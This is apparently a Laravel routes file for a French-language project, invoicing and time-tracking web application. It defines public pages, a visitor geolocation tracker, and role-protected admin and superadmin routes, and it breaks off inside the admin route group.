<?php

use App\Models\Tasks;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\ContactController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\AlertController;
use App\Http\Controllers\admin\adminController;
use App\Http\Controllers\admin\OnboardingController;
use App\Http\Controllers\admin\tasksController;
use App\Http\Controllers\admin\teamsController;
use App\Http\Controllers\admin\clientsController;
use App\Http\Controllers\admin\projectController;
use App\Http\Controllers\admin\employeesController;
use App\Http\Controllers\admin\entrepriseController as AdminEntrepriseController;
use App\Http\Controllers\admin\todolisteController;
use App\Http\Controllers\superadmin\RoleController;
use App\Http\Controllers\superadmin\userController;
use App\Http\Controllers\superadmin\IndexController;
use App\Http\Controllers\superadmin\EntrepriseController;
use App\Http\Controllers\superadmin\PermissionController;
use App\Http\Controllers\employees\indexController as EmployeesIndexController;
use App\Http\Controllers\employees\tasksController as EmployeestasksController;
use App\Http\Controllers\employees\teamsController as EmployeesteamsController;
use App\Http\Controllers\admin\BillitController;
use App\Http\Controllers\Auth\PasswordResetLinkController;
use App\Http\Controllers\admin\CalendarController;
use App\Http\Controllers\admin\SubscriptionController;
use App\Http\Controllers\manager\ManagerAuthController;
use App\Http\Controllers\manager\ManagerDashboardController;
use App\Http\Controllers\manager\ManagerSubscriptionController;
use App\Http\Controllers\LangController;
use App\Http\Controllers\ChatbotController;
use App\Http\Controllers\StripeWebhookController;
use App\Http\Controllers\admin\SearchController;
use App\Http\Controllers\admin\SupportController;
use App\Models\Visit;
use Illuminate\Support\Facades\Http;


/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

$trackPublicVisit = function () {
    try {
        $ip = request()->ip();
        $country = null;
        $countryCode = null;
        $city = null;
        $referrer = null;
        $utmSource = null;
        $deviceType = null;

        if (!app()->environment('local') && $ip && !in_array($ip, ['127.0.0.1', '::1'], true)) {
            try {
                $response = Http::timeout(2)->get('http://ip-api.com/json/' . $ip . '?fields=status,country,countryCode,city');
                if ($response->ok() && ($response['status'] ?? null) === 'success') {
                    $country = $response['country'] ?? null;
                    $countryCode = $response['countryCode'] ?? null;
                    $city = $response['city'] ?? null;
                }
            } catch (\Throwable $e) {
                // Ignore geo lookup failures to keep the public pages responsive.
            }
        }

        // Basic referrer / UTM / device tracking
        $referrerHeader = request()->headers->get('referer');
        if (is_string($referrerHeader) && $referrerHeader !== '') {
            $referrer = parse_url($referrerHeader, PHP_URL_HOST) ?: $referrerHeader;
        }

        $utmSource = request()->query('utm_source');

        $userAgent = (string) request()->userAgent();
        $uaLower = strtolower($userAgent);
        if (str_contains($uaLower, 'mobile') || str_contains($uaLower, 'android') || str_contains($uaLower, 'iphone')) {
            $deviceType = 'mobile';
        } elseif (str_contains($uaLower, 'tablet') || str_contains($uaLower, 'ipad')) {
            $deviceType = 'tablet';
        } else {
            $deviceType = 'desktop';
        }

        Visit::create([
            'ip' => $ip,
            'country' => $country,
            'country_code' => $countryCode,
            'city' => $city,
            'url' => request()->fullUrl(),
            'user_agent' => substr($userAgent, 0, 255),
            'referrer' => $referrer,
            'utm_source' => $utmSource,
            'device_type' => $deviceType,
        ]);
    } catch (\Throwable $e) {
        // Never block the public pages if tracking fails.
    }
};

Route::get('/', function () use ($trackPublicVisit) {
    $trackPublicVisit();

    return view('home.index');
})->name("welcome");

Route::get('/produit', function () use ($trackPublicVisit) {
    $trackPublicVisit();

    return view('product.index');
})->name("produit");

Route::get('/tarifs', function () use ($trackPublicVisit) {
    $trackPublicVisit();

    // Guests start with the free trial; authenticated users go straight
    // to the existing Stripe checkout / upgrade flow (plans solo/premium/pro
    // handled by SubscriptionController@choosePlan).
    $isGuest = auth()->guest();
    $planLinks = [
        'solo' => $isGuest ? route('register') : route('subscription.choose', ['plan' => 'solo']),
        'premium' => $isGuest ? route('register') : route('subscription.choose', ['plan' => 'premium']),
        'pro' => $isGuest ? route('register') : route('subscription.choose', ['plan' => 'pro']),
    ];
    $trialLink = $isGuest ? route('register') : route('profile.upgrade');

    return view('pricing.index', compact('planLinks', 'trialLink'));
})->name("tarifs");

Route::get('/mentions-legales', function () {
    return view('legal.mentions');
})->name("mentions-legales");

Route::get('/confidentialite', function () {
    return view('legal.confidentialite');
})->name("confidentialite");

Route::get('/cookies', function () {
    return view('legal.cookies');
})->name("cookies");

Route::get('/cgu', function () {
    return view('legal.cgu');
})->name("cgu");

Route::get('/cgv', function () {
    return view('legal.cgv');
})->name("cgv");

Route::get('/contact', function () {
    return view('components.Home_page.contact');
})->name('contact');

Route::post('/contact', [ContactController::class, 'submit'])->name('contact.submit');

Route::get('/about', function () {
    return view('components.Home_page.about');
})->name('about');

Route::get('/faq', function () {
    return view('components.Home_page.faq');
})->name('faq');

Route::get('/demo', function () {
    return view('components.Home_page.demo');
})->name('demo');

Route::get('/blog', [\App\Http\Controllers\BlogController::class, 'index'])->name('blog.index');
Route::get('/blog/{post:slug}', [\App\Http\Controllers\BlogController::class, 'show'])->name('blog.show');

// Public chatbot endpoint for landing page assistant
Route::post('/chatbot/ask', [ChatbotController::class, 'ask'])->name('chatbot.ask');

Route::get('lang/change', [LangController::class, 'change'])->name('changeLang');

Route::get('/dashboard', function () {
    if (auth()->check() && auth()->user()->hasRole('Admin')) {
        return redirect()->route('admin.index');
    } elseif (auth()->check() && auth()->user()->hasRole('super_admin')) {
        return redirect()->route('superadmin.index');
    } elseif (auth()->check() && auth()->user()->hasRole('Employee')) {
        return redirect()->route('employee.index');
    } elseif (auth()->check() && auth()->user()->hasRole('Responsable de projet')) {
        return redirect()->route('Responsable_de_projet.index');
    } elseif (auth()->check() && auth()->user()->hasRole('Responsable de projet et gestionnaire')) {
        return redirect()->route('Responsable_gestionnaire.index');
    } else {
        return view('dashboard');
    }
})->middleware(['auth', 'verified', \App\Http\Middleware\CustomLoginMiddleware::class])->name('dashboard');

Route::middleware(['auth', 'verified', 'role:super_admin'])->name('superadmin.')->prefix('superadmin')->group(function () {
    Route::get("/", [IndexController::class, "index"])->name("index");
    Route::resource('/roles', RoleController::class)->except(['create', 'store'])->where(['role' => '[0-9]+']);
    Route::post('/roles/{role}/assign_permission', [RoleController::class, "assign_permission"])->name("roles.assign_permission");
    Route::post('superadmin/roles/{role}/delete_permission', [RoleController::class, "delete_permission"])->name('roles.delete_permission');
    Route::resource('/permissions', PermissionController::class);
    Route::resource('/users', userController::class);
    Route::post('/users/{user}/assign_roles', [userController::class, "assign_roles"])->name("users.assign_roles");
    Route::get('/entreprise/index', [EntrepriseController::class, "index"])->name("entreprise.index");
    Route::post('/entreprise/{entreprise}/disactivate', [EntrepriseController::class, "disactivate"])->name("entreprise.disactivate");
    Route::post('/entreprise/{entreprise}/activate', [EntrepriseController::class, "activate"])->name("entreprise.activate");
});






//Route::middleware(['auth', 'role:Admin', \App\Http\Middleware\CheckEntrepriseDuration::class])->name('admin.')->prefix('admin')->group(function () {

Route::middleware(['auth', 'verified', 'role:Admin'])->name('admin.')->prefix('admin')->group(function () {
    Route::get("/", [adminController::class, "index"])->name("index");

    // First-time onboarding for new workspaces (same auth/role guards as the dashboard)
    Route::get('/onboarding', [OnboardingController::class, 'welcome'])->name('onboarding.welcome');
    Route::post('/onboarding/discover', [OnboardingController::class, 'discover'])->name('onboarding.discover');
    Route::get('/onboarding/step-1', [OnboardingController::class, 'step1'])->name('onboarding.step1');
    Route::get('/onboarding/step-2', [OnboardingController::class, 'step2'])->name('onboarding.step2');
    Route::post('/onboarding/complete', [OnboardingController::class, 'complete'])->name('onboarding.complete');
    Route::get('/onboarding/done', [OnboardingController::class, 'done'])->name('onboarding.done');
    Route::resource('/roles', RoleController::class)->except(['create', 'store'])->where(['role' => '[0-9]+']);
    Route::post('/roles/{role}/assign_permission', [RoleController::class, "assign_permission"])->name("roles.assign_permission");
    Route::post('admin/roles/{role}/delete_permission', [RoleController::class, "delete_permission"])->name('roles.delete_permission');
    Route::resource('/permissions', PermissionController::class);
    Route::resource('/employees', employeesController::class)->except(['destroy']);
    Route::delete('/employees/{employee}/destroy', [employeesController::class, "destroy"])->name('employees.destroy');
    Route::post('/employees/{employee}/assign_roles', [employeesController::class, "assign_roles"])->name("employees.assign_roles");
    Route::post('/employee/{employee}/desactivate', [employeesController::class, "desactivate"])->name("employee.deactivate");
    Route::post('/employee/{employee}/activate', [employeesController::class, "activate"])->name("employee.activate");
    Route::resource('/clients', clientsController::class);
    Route::delete('/clients/{client}/destroy', [clientsController::class, "destroy"])->name('client.destroy');

    Route::put('/clients/{client}/addContact', [clientsController::class, 'addContact'])->name('clients.addContact');

    Route::resource('/tasks', tasksController::class)->except(['show', 'create', 'store']);
    Route::get('/tasks/show/{task_id}', [tasksController::class, "show"])->name('tasks.show');
    Route::post('/tasks/{task}/status/{status}', [tasksController::class, "status"])->name('tasks.status');
    Route::post('/tasks/move-task', [tasksController::class, "moveTask"])->name('tasks.moveTask');
    Route::post('/tasks/manual-timer', [tasksController::class, 'createManualTimer'])
        ->middleware('can:Add manual timer')->name('tasks.manualTimer');
    Route::get('/tasks/create/{project_id?}', [tasksController::class, "create"])->name('tasks.create');
    Route::post('/tasks/store/{project_id}', [tasksController::class, "store"])->name('tasks.store');
    Route::get('/tasks/board', [tasksController::class, "board"])->name('tasks.board');
    Route::resource('/teams', teamsController::class);
    Route::get('/projects/create/{client_id?}', [projectController::class, "create"])->name('projects.create');
    Route::post('/projects/store/{client_id?}', [projectController::class, "store"])->name('projects.store');
    Route::get('projects/report', [ProjectController::class, 'projectReport'])->name('projects.report');
    Route::resource('/projects', projectController::class)->except(['create', 'store']);
    Route::post('/projects/{project}/status/{status}', [projectController::class, "status"])->name('projects.status');
    Route::post('projects/updateProject', [projectController::class, 'updateProject'])->name('projects.updateProject');

    Route::resource('/todoliste', todolisteController::class)->except(['show', 'update', 'destroy']);

    //Route::get('/todoliste/create', [todolisteController::class,'create'])->name('todoliste.create');
    //Route::post('/todoliste/store', [todolisteController::class,'store'])->name('todoliste.store');
    //Route::get('/todoliste/edit/{$id}', [todolisteController::class,'edit'])->name('todoliste.edit');
    Route::post('/todoliste/update/{id}', [todolisteController::class, 'update'])->name('todoliste.update');
    Route::delete('/todoliste/destroy', [todolisteController::class, 'destroy'])->name('todoliste.destroy');
    Route::delete('/todoliste/deleteItem/{id}', [todolisteController::class, 'deleteItem'])->name('todoliste.deleteItem');
    Route::post('/todoliste/updatestatus/{todoliste}', [todolisteController::class, 'updateStatus'])->name('todoliste.updateStatus');

    // Enterprise-optimized help & support
    Route::get('/support', [SupportController::class, 'create'])->name('support.create');
    Route::post('/support', [SupportController::class, 'store'])->name('support.store');
    Route::get('/support/tickets', [SupportController::class, 'index'])->name('support.index');
    Route::delete('/support/tickets/{ticket}', [SupportController::class, 'destroy'])->name('support.destroy');

    Route::get('/tasks/pointage', [tasksController::class, 'pointage'])->name('tasks.pointage');
    Route::get('tasks/tasks-info/{startDate}', [TasksController::class, 'getTasksInfo'])->name('tasks.info');
    Route::get('tasks/tasks-info-interval/{startDate}/{endDate}', [TasksController::class, 'getTasksInfoInterval'])->name('tasks.interval-info');
    Route::get('tasks/get-project-name/{taskName}', [TasksController::class, 'getProjectName']);
    Route::get('tasks/get-employee-name/{employeeId}', [TasksController::class, 'getEmployeeName']);

    Route::post('/tasks/{task}/start/{employee_id}', [tasksController::class, 'start'])->name('employee.tasks.start');
    Route::post('/tasks/{task}/stop/{employee_id}', [tasksController::class, 'stop'])->name('employee.tasks.stop');

    Route::post('/tasks/{task}/pause/{employee_id}', [tasksController::class, 'pause'])->name('employees.tasks.pause');
    Route::post('/tasks/{task}/resume/{employee_id}', [tasksController::class, 'resume'])->name('employees.tasks.resume');

    Route::resource('/Enterprise_infos', AdminEntrepriseController::class)->except(['show']);
    Route::post('Enterprise_Billings/updateBillings', [AdminEntrepriseController::class, "updateBillings"])->name('Enterprise_Billings.updateBillings');
    Route::post('Enterprise_infos/updateInfos', [AdminEntrepriseController::class, "updateInfos"])->name('Enterprise_infos.updateInfos');
    Route::post('Enterprise_SMTPinfos/updateSMTPInfos', [AdminEntrepriseController::class, "updateSMTPInfos"])->name('Enterprise_SMTPinfos.updateSMTPInfos');
    Route::post('entreprise/validate/{chargeid}/{budget_id}', [AdminEntrepriseController::class, 'validateBilling'])->name('entreprise.validateBilling');
    Route::post('entreprise/unvalidate/{chargeid}/{budget_id}', [AdminEntrepriseController::class, 'unvalidateBilling'])->name('entreprise.unvalidateBilling');
    Route::post('entreprise/addBudget', [AdminEntrepriseController::class, 'addBudget'])->name('entreprise.addBudget');
    Route::get('/entrepriseBillings/downloadRepports', [AdminEntrepriseController::class, 'downloadBillingsRepports'])->name('entrepriseBillings.downloadRepports');





    Route::post('clients/updateClient', [clientsController::class, 'updateClient'])->name('clients.updateClient');
    Route::post('clients/updateContact', [clientsController::class, 'updateContact'])->name('clients.updateContact');

    Route::post('employees/updateEmployee', [employeesController::class, 'updateEmployee'])->name('employees.updateEmployee');

    Route::get('/projects/invoice/{id}', [ProjectController::class, 'invoice'])->name('projects.invoice');
    Route::get('/projects/invoicebyduration/{name}/{duration}/{cost}', [projectController::class, "invoicebyduration"])->name('projects.invoicebyduration');
    Route::get('/invoices/fullinvoice', [projectController::class, "fullinvoice"])->name('invoices.fullinvoice');
    Route::get('/projects/invoicebyduration2/{id}/{startdate}/{enddate}', [projectController::class, "invoicebyduration2"])->name('projects.invoicebyduration2');

    Route::get('/invoices/invoicehistory', [projectController::class, "invoicehistory"])->name('invoices.invoicehistory');
    Route::delete('/invoice/{invoice}/destroy', [projectController::class, "destroyInvoice"])->name('invoice.destroy');

    Route::post('/invoice/{invoice}/desactivate', [projectController::class, "desactivate"])->name("invoice.deactivate");
    Route::post('/invoice/{invoice}/activate', [projectController::class, "activate"])->name("invoice.activate");
    Route::post('/invoice/{invoice}/unarchive', [projectController::class, "unarchiveInvoice"])->name("invoice.unarchive");

    Route::get('/invoice/downloadPartial/{invoiceNumber}', [projectController::class, "downloadPeriodInvoice"])->name("invoice.downloadPartial");
    Route::get('/invoice/downloadFull/{invoiceNumber}', [projectController::class, "downloadFullInvoice"])->name("invoice.downloadFull");

    Route::post('/invoice/remind', [projectController::class, "sendemailreminder"])->name('invoice.remind');

    Route::get('/invoice/Manualremind/{id}/{reminder}', [projectController::class, "sendManualReminder"])->name('invoice.sendManualremind');

    Route::post('/invoice/SendInvReminder/{invoice_id}/{reminder_number}', [projectController::class, "SendInvReminder"])->name('invoice.SendInvReminder');

    Route::get('/get-contacts/{clientId}', [projectController::class, "getContacts"]);
    Route::post('/send-invoice/{invoice_id}', [projectController::class, 'sendInvoice'])->name('invoice.sendInvoice');

    Route::get('/devis/generateDevis', [projectController::class, "generateDevis"])->name('devis.generateDevis');
    Route::post('/devis/sendDevis', [projectController::class, "sendDevis"])->name('devis.sendDevis');
    Route::post('/devis/saveDevisPdf', [projectController::class, "saveDevisPdf"])->name('devis.saveDevisPdf');

    Route::get('/devis/devishistory', [projectController::class, "devishistory"])->name('devis.devishistory');
    Route::delete('/devis/{devis}/destroy', [projectController::class, "destroydevis"])->name('devis.destroy');
    Route::get('/devis/downloadDevis/{id}', [projectController::class, "downloadDevis"])->name("devis.downloadDevis");

    Route::post('/devis/{devis}/acceptDevis', [projectController::class, "acceptDevis"])->name("devis.acceptDevis");
    Route::post('/devis/{devis}/declineDevis', [projectController::class, "declineDevis"])->name("devis.declineDevis");

    Route::get('/pointage/index', [tasksController::class, 'Markpointage'])->name('pointage.index');

    Route::post('/pointage/{tasks}/{employee_id}/start', [tasksController::class, "start"])->name('tasks.start');
    Route::post('/pointage/{tasks}/{employee_id}/stop', [tasksController::class, "stop"])->name('tasks.stop');
    Route::post('/pointage/{tasks}/{employee_id}/pause', [tasksController::class, 'pause'])->name('tasks.pause');
    Route::post('/pointage/{tasks}/{employee_id}/resume', [tasksController::class, 'resume'])->name('tasks.resume');

    Route::get('/invoices/pdf/{invoiceName}', [projectController::class, "servePdf"])->name('invoices.servePdf');

    Route::get('/invoices/parameters', [projectController::class, "parameters"])->name('invoices.parameters');
    Route::get('/devis/parameters', [projectController::class, "devisparameters"])->name('devis.parameters');

    Route::post('pointage/fetch-duration', [tasksController::class, 'fetchDuration'])->name('fetch.duration');

    Route::post('/tasks/update-duration/{task_id}', [tasksController::class, "updateDuration"])->name('tasks.updateDuration');

    Route::post('/entreprise/updateImage', [AdminEntrepriseController::class, "updateImage"])->name('entreprise.updateImage');

    Route::delete('/clients/destroyContact/{contact_id}', [clientsController::class, "destroyContact"])->name('clients.destroyContact');

    Route::get('/Clientrepports/downloadRepports', [clientsController::class, 'downloadClinetsRepports'])->name('Clientrepports.downloadRepports');
    Route::get('/Employeesrepports/downloadRepports', [employeesController::class, 'downloadEmployeesRepports'])->name('Employeesrepports.downloadRepports');
    Route::get('/Projectsrepports/downloadRepports', [projectController::class, 'downloadProjectsRepports'])->name('Projectsrepports.downloadRepports');
    Route::get('/Tasksrepports/downloadRepports', [tasksController::class, 'downloadTasksRepports'])->name('Tasksrepports.downloadRepports');

    Route::get('/Pointagerepports/downloadRepports/{startDate}/{endDate}', [tasksController::class, 'downloadPointageRepports'])->name('Pointagerepports.downloadRepports');
    Route::get('/Pointagerepports/downloadOneDayRepports/{startDate}', [tasksController::class, 'downloadOneDayRepports'])->name('Pointagerepports.downloadOneDayRepports');

    Route::get('/CustomerPointagerepports/CustomerdownloadRepports/{startDate}/{endDate}', [tasksController::class, 'CustomerdownloadPointageRepports'])->name('CustomerPointagerepports.CustomerdownloadRepports');
    Route::get('/CustomerPointagerepports/CustomerdownloadOneDayRepports/{startDate}', [tasksController::class, 'CustomerdownloadOneDayRepports'])->name('Pointagerepports.CustomerdownloadOneDayRepports');

    Route::get('/Teamssrepports/downloadRepports', [teamsController::class, 'downloadTeamsRepports'])->name('Teamssrepports.downloadRepports');

    Route::get('/Invoicessrepports/downloadRepports', [projectController::class, 'downloadInvoicesRepports'])->name('Invoicessrepports.downloadRepports');

    Route::get('/Devissrepports/downloadRepports', [projectController::class, 'downloadDevisRepports'])->name('Devissrepports.downloadRepports');

    Route::get('/invoice/creditNote/{id}', [projectController::class, "generateCreditNote"])->name('invoice.creditNote');

    Route::get('/invoice/creditNoteHistory', [projectController::class, "creditNoteHistory"])->name('invoice.creditNoteHistory');

    Route::get('/invoices/serveCreditNotePdf/{credit_note_number}', [projectController::class, "serveCreditNotePdf"])->name('invoices.serveCreditNotePdf');

    Route::get('/creditNote/downloadRepports', [projectController::class, 'downloadcreditNoteRepports'])->name('creditNote.downloadRepports');

    Route::delete('/credit_note/{credit_note}/destroy', [projectController::class, "destroyCreditNote"])->name('credit_note.destroy');

    Route::get('/creditNote/creditNoteHistory', [projectController::class, "creditNoteHistory"])->name('creditNote.creditNoteHistory');

    // Detailed Credit Note Routes
    Route::get('/invoice/detailedCreditNote/{id}', [projectController::class, "createDetailedCreditNote"])->name('invoice.detailedCreditNote');
    Route::post('/invoices/confirmDetailedCreditNote/{invoiceID}', [projectController::class, "confirmDetailedCreditNote"])->name('invoices.confirmDetailedCreditNote');

    Route::post('workdaysrepports/updateWorkdaysRepport', [employeesController::class, 'updateWorkdaysRepport'])->name('workdaysrepports.updateWorkdaysRepport');

    Route::get('/workDaysReports/index', [employeesController::class, "workDaysReportsIndex"])->name('workDaysReports.index');

    Route::get('/workDaysReports/filter-reports', [employeesController::class, 'filterReports'])->name('workDaysReports.filterReports');

    Route::get('/workDaysReports/downloadRepports', [employeesController::class, 'downloadworkDaysRepports'])->name('workDaysReports.downloadRepports');

    Route::post('/workDaysReports/nextMonthRepports', [employeesController::class, 'nextMonthRepports'])->name('workDaysReports.nextMonthRepports');

    // New routes for PDF preview and emailing
    Route::get('/workDaysReports/pdf', [employeesController::class, 'generatePdfForPreview'])->name('workDaysReports.pdf');
    Route::post('/workDaysReports/sendEmail', [employeesController::class, 'sendWorkdaysReportEmail'])->name('workDaysReports.sendEmail');

    Route::get('/notedefrais/generateNoteDeFrais', [projectController::class, "generateNoteDeFrais"])->name('notedefrais.generateNoteDeFrais');
    Route::post('/notedefrais/savePdf', [projectController::class, "saveNoteDeFraisPdf"])->name('notedefrais.saveNoteDeFraisPdf');
    Route::get('/notedefrais/parameters', [projectController::class, "notedefraisparameters"])->name('notedefrais.parameters');
    Route::get('/notedefrais/downloadNoteDeFrais/{id}', [projectController::class, "downloadNoteDeFrais"])->name("notedefrais.downloadNoteDeFrais");
    Route::get('/notedefrais/notedefraishistory', [projectController::class, "notedefraishistory"])->name('notedefrais.notedefraishistory');
    Route::delete('/notedefrais/{notedefrais}/destroy', [projectController::class, "destroyNotedeFrais"])->name('notedefrais.destroy');
    Route::get('/notedefrais/downloadRepports', [projectController::class, 'downloadNoteDeFraisRepports'])->name('notedefrais.downloadRepports');

    Route::get('filter/employees/{employeeId}/projects', [ProjectController::class, 'getEmployeeProjects'])->name('filter.getEmployeeProjects');
    Route::get('filter/employees/{employeeId}/tasks', [ProjectController::class, 'getEmployeeTasks'])->name('filter.getEmployeeTasks');
    Route::get('filter/projects/{projectId}/tasks', [ProjectController::class, 'getProjectTasks'])->name('filter.getProjectTasks');
    Route::get('filter/tasks/{taskId}', [ProjectController::class, 'getTaskInfo'])->name('filter.getTaskInfo');
    Route::get('filter/projects', [ProjectController::class, 'getAllProjects'])->name('filter.getAllProjects');
    Route::get('filter/tasks', [ProjectController::class, 'getAllTasks'])->name('filter.getAllTasks');

    Route::get('/projects/partialInvoice/{projectid}/{amount}', [projectController::class, "PartialInvoice"])->name('projects.PartialInvoice');
    Route::get('/projects/percentageInvoice/{projectid}/{percentage}', [projectController::class, "PercentageInvoice"])->name('projects.PercentageInvoice');

    Route::post('/projects/confirm-full-invoice/{projectID}/{budget}/{comment?}', [ProjectController::class, 'confirmFullInvoice'])->name('projects.confirmFullInvoice');

    Route::post('/projects/confirm-period-invoice/{projectID}/{startdate}/{enddate}/{comment?}', [ProjectController::class, 'confirmPeriodInvoice'])->name('projects.confirmPeriodInvoice');
    Route::post('/projects/confirm-percentage-invoice/{projectID}/{percentage}/{comment?}', [ProjectController::class, 'confirmPercentageInvoice'])->name('projects.confirmPercentageInvoice');
    Route::post('/projects/confirm-partial-invoice/{projectID}/{amount}/{comment?}', [ProjectController::class, 'confirmPartialInvoice'])->name('projects.confirmPartialInvoice');

    Route::post('/projects/decline-Invoice', [ProjectController::class, 'declineInvoice'])->name('projects.declineInvoice');

    Route::post('/projects/archive/{project_id}', [ProjectController::class, "archiveProject"])->name('projects.archive');
    Route::post('/projects/unarchive/{project_id}', [ProjectController::class, "unarchiveProject"])->name('projects.unarchive');
    Route::get('projectsArchived/archive', [ProjectController::class, 'projectArchiveIndex'])->name('projectsArchived.archiveIndex');

    Route::post('/devis/archive/{devis_id}', [ProjectController::class, "archiveDevis"])->name('devis.archive');
    Route::post('/devis/unarchive/{devis_id}', [ProjectController::class, "unarchiveDevis"])->name('devis.unarchive');
    Route::get('devisArchived/archive', [ProjectController::class, 'devisArchiveIndex'])->name('devisArchived.archiveIndex');

    Route::post('creditNote/confirm/{id}/{noteType}/{noteAmount}', [ProjectController::class, 'ConfirmCreditNote'])->name('creditNote.confirm');

    Route::post('/confirm-frais-note', [ProjectController::class, 'confirmFraisNote'])->name('notedefrais.confirmFraisNote');

    Route::post('/projects/updateInfos/{id}/{client_id?}', [ProjectController::class, 'update'])->name('projects.updateInfos');

    Route::get('/tasks/{employee}/durationInfos/{task}', [tasksController::class, 'durationInfos'])->name('tasks.durationInfos');

    Route::post('/devis/saveDuplicateDevis', [projectController::class, "saveDuplicateDevis"])->name('devis.saveDuplicateDevis');
    Route::get('/devis/duplicateDevis/{devis_id}', [projectController::class, "duplicateDevis"])->name('devis.duplicateDevis');

    Route::get('/pointage/filterPointageByDate', [tasksController::class, 'filterPointageByDate'])->name('pointage.filterPointageByDate');

    Route::get('/pointage/get-timer-state', [tasksController::class, 'get_timer_state'])->name('pointage.get_timer_state');

    Route::get('/pointage/filter-table', [tasksController::class, 'filterPointageTable'])->name('pointage.filterPointageTable');

    Route::get('invoiceArchived/archive', [ProjectController::class, 'invoiceArchiveIndex'])->name('invoiceArchived.archiveIndex');

    Route::delete('/billing/destroy/{id}', [AdminEntrepriseController::class, 'destroyBillings'])->name('billing.destroy');
    Route::post('/budget/update/{id}', [AdminEntrepriseController::class, 'updateCharge'])->name('budget.updateCharge');


    Route::get('/calendar', [CalendarController::class, 'index'])->name('calendar.index');
    Route::get('/calendar/events', [CalendarController::class, 'getEvents'])->name('calendar.events');
    Route::post('/calendar/events', [CalendarController::class, 'store'])->name('calendar.store');
    Route::put('/calendar/events/{id}', [CalendarController::class, 'update'])->name('calendar.update');
    Route::delete('/calendar/events/{id}', [CalendarController::class, 'destroy'])->name('calendar.destroy');
    Route::patch('/calendar/events/{id}/dates', [CalendarController::class, 'updateDates'])->name('calendar.updateDates');

    Route::get('/calendar/daily-events', [CalendarController::class, 'getDailyEvents'])->name('calendar.dailyEvents');
    Route::get('/calendar/events/current-month', [CalendarController::class, 'getCurrentMonthEvents'])->name('calendar.currentMonthEvents');
    Route::get('/calendar/send-events/preview', [CalendarController::class, 'previewSendEvents'])->name('calendar.send-events.preview');
    Route::get('/calendar/events/pdf', [CalendarController::class, 'generateEventsPDF'])->name('calendar.events.pdf');
    Route::post('/calendar/send-events-email', [CalendarController::class, 'sendEventsEmail'])->name('calendar.send-events-email');

    // Edit Full Invoice routes
    Route::get('/invoices/edit/{id}', [ProjectController::class, 'editFullInvoice'])->name('invoices.editFullInvoice');
    Route::put('/invoices/update/{id}', [ProjectController::class, 'updateFullInvoice'])->name('invoices.updateFullInvoice');

    // Edit Partial Invoice routes
    Route::get('/invoices/partial/edit/{id}', [ProjectController::class, 'editPartialInvoice'])->name('invoices.editPartialInvoice');
    Route::put('/invoices/partial/update/{id}', [ProjectController::class, 'updatePartialInvoice'])->name('invoices.updatePartialInvoice');

    // Edit Percentage Invoice routes
    Route::get('/invoices/percentage/edit/{id}', [ProjectController::class, 'editPercentageInvoice'])->name('invoices.editPercentageInvoice');
    Route::put('/invoices/percentage/update/{id}', [ProjectController::class, 'updatePercentageInvoice'])->name('invoices.updatePercentageInvoice');

    // Edit Period Invoice routes
    Route::get('/invoices/period/edit/{id}', [ProjectController::class, 'editPeriodInvoice'])->name('invoices.editPeriodInvoice');
    Route::put('/invoices/period/update/{id}', [ProjectController::class, 'updatePeriodInvoice'])->name('invoices.updatePeriodInvoice');

    Route::get('/devis/edit/{id}', [projectController::class, 'editDevis'])->name('devis.editDevis');
    Route::put('/devis/update/{id}', [projectController::class, 'updateDevis'])->name('devis.updateDevis');

    Route::post('/projects/{project}/upload-file', [ProjectController::class, 'uploadProjectFile'])->name('projects.uploadFile');
    Route::get('/projects/downloadfiles/{file_name}', [ProjectController::class, 'downloadfiles'])->name('projects.downloadfiles');
    Route::delete('/projects/deletefiles/{file_name}', [ProjectController::class, 'deletefiles'])->name('projects.deletefiles');

    Route::post('/tasks/update-{field}/{id}', [tasksController::class, 'updateField'])->name('tasks.updateField');
    Route::get('/invoices/generate-detailed', [projectController::class, 'generateDetailedInvoice'])->name('invoices.generate.Detailed');
    Route::post('/invoices/detailed', [projectController::class, 'detailedInvoice'])->name('invoices.detailed');
    Route::post('/invoices/confirmDetailedInvoice/{projectID}', [projectController::class, 'confirmDetailedInvoice'])->name('invoices.confirmDetailedInvoice');

    Route::post('/employees/archive/{employee_id}', [employeesController::class, "archiveEmployee"])->name('employees.archive');
    Route::post('/employees/unarchive/{employee_id}', [employeesController::class, "unarchiveEmployee"])->name('employees.unarchive');
    Route::get('employeesArchived/archive', [employeesController::class, 'employeeArchiveIndex'])->name('employeesArchived.archiveIndex');

    Route::get('/refresh-employees', [adminController::class, 'refreshEmployees'])->name('refresh-employees');
    Route::get('/refresh-projects', [adminController::class, 'refreshProjects'])->name('refresh-projects');

    Route::get('/invoices/editDetailedInvoice/{id}', [ProjectController::class, 'editDetailedInvoice'])->name('invoices.editDetailedInvoice');
    Route::post('/invoices/updateDetailedInvoice/{id}', [ProjectController::class, 'updateDetailedInvoice'])->name('invoices.updateDetailedInvoice');

    // Add this route within your admin group/middleware
    Route::get('/get-devis/{projectId}', [ProjectController::class, 'getDevisByProject'])->name('get.devis.by.project');
    Route::get('/get-devis-comment/{devisId}', [ProjectController::class, 'getDevisComment']);
    Route::get('/get-all-devis', [ProjectController::class, 'getAllDevis']);

    Route::get('/tasks/get-project-tasks/{project}', [TasksController::class, 'getProjectTasks']);
    Route::post('/tasks/move-duration', [TasksController::class, 'moveDuration']);
    Route::get('/employees/{employeeId}/projects', [TasksController::class, 'getEmployeeProjects']);
    Route::post('/clients/filterInvoices/{client}', [clientsController::class, 'filterInvoices'])->name('clients.filterInvoices');

    Route::get('/clients/downloadInvoicesRepports/{client}', [clientsController::class, 'downloadInvoicesRepports'])->name('clients.downloadInvoicesRepports');

    Route::get('/filter/all-projects', [TasksController::class, 'getAllProjects']);
    Route::get('/filter/all-tasks', [TasksController::class, 'getAllTasks']);

    Route::get('/filter-invoices', [adminController::class, 'filterInvoices'])->name('filter.invoices');

    Route::post('/credit_note/send/{credit_note_id}', [ProjectController::class, 'sendCreditNote'])->name('credit_note.send');

    Route::get('/filter/clients/{client}/projects', [tasksController::class, 'getClientProjects'])->name('filter.client.projects');

    Route::get('/invoice/{invoice}/recipients', [ProjectController::class, 'getRecipients']);

    Route::get('/Pointagerepports/downloadMultipleTasksRepports/{startDate}/{endDate}', [tasksController::class, 'downloadMultipleTasksRepports'])->name('Pointagerepports.downloadMultipleTasksRepports');

    // Customer Report Routes
